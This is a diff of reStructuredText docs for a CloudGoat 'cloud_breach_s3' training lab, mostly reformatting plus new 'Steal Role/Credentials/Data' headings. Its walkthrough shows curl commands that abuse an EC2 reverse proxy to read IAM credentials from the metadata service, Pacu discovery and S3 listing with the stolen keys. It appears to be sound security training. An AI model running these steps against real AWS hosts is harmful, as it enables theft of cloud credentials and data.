@@ -1,6 +1,5 @@
 .. toctree::
    :maxdepth: 2
-   :caption: ToC:
    :hidden:
 
    index
@@ -19,7 +18,7 @@ Enumeration - AWS Suspicious Credential Usage - AWS Suspicious EC2
 Enumeration - AWS S3 Enumeration
 
 .. figure:: ./images/critical.png
-   :alt: critical
+
 
    critical
 
@@ -49,7 +48,7 @@ Requirments
    -  AWS `Named profile
       configured <https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html>`__
 
-Install system prerequisites (Ubuntu)
+Install system requirements (Ubuntu)
 #####################################
 .. code:: bash
 
@@ -109,9 +108,12 @@ Install Cloudgoat
 
 -  Use git to clone the Cloudgoat repo to home directory and change to
    the new directory
-   ``bash      git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat && cd ~/cloudgoat``
+   .. code:: bash     
+   
+   git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat && cd ~/cloudgoat
 -  Install the Cloudgoat dependencies
-   ``bash       pip3 install -r ./core/python/requirements.txt && chmod u+x cloudgoat.py``
+   .. code:: bash
+   pip3 install -r ./core/python/requirements.txt && chmod u+x cloudgoat.py
 
 Install Pacu
 ############
@@ -169,7 +171,7 @@ reverse-proxy server in EC2.
    ``bash      ~/cloudgoat/cloudgoat.py create cloud_breach_s3``
 
 .. figure:: ./images/cloudgoatout.png
-   :alt: Cloudgoat
+
 
    Cloudgoat
 
@@ -185,6 +187,9 @@ EC2 metadata service and acquire instance profile keys. Then, use those
 keys to discover, access, and exfiltrate sensitive data from an S3
 bucket.
 
+   Steal Role
+   **********
+
 -  Replace ``<ec2-ip-address>`` with the IP address from the previoues
    step to get a role name. **Copy the response to a text file** as you
    will need the role name for the next attack
@@ -194,9 +199,10 @@ bucket.
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
 
 .. figure:: ./images/role.png
-   :alt: role
 
-   role
+
+   Steal Crendentials
+   ******************
 
 -  Replace ``<ec2-ip-address>`` and ``<ec2-role-name>`` from the
    previous steps to get the keys. **Copy response to text file** as you
@@ -207,9 +213,10 @@ bucket.
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
 
 .. figure:: ./images/ssrf2.png
-   :alt: ssrf2
 
-   ssrf2
+
+   Discovery 
+   *********
 
 -  Next we will use pacu to do discovery with the stolen crendentials
 
@@ -219,9 +226,9 @@ bucket.
       stolen credentials from the previous step
 
 .. figure:: ./images/pacukeys.png
-   :alt: pacukeys
 
-   pacukeys
+   Output
+   ******
 
 -  Use pacu to start disocvery using the following modules
 
@@ -236,11 +243,13 @@ bucket.
 .. figure:: ./images/output.png
    :alt: output
 
-   output
 
 -  The stolen credentials have full access to S3
 
    -  Exit pacu by typing ``exit`` and return to attack
+   
+   Steal Data
+   **********
 
 -  Create a new aws profile with stolen credentials
 
@@ -263,8 +272,6 @@ bucket.
 
    .. figure:: ./images/sestoken.png
       :alt: sestoken
-
-      sestoken
 
 -  List and search buckets the stolen credentails have access to
    ``bash  aws s3 ls --profile cloud_breach_s3`` |list|
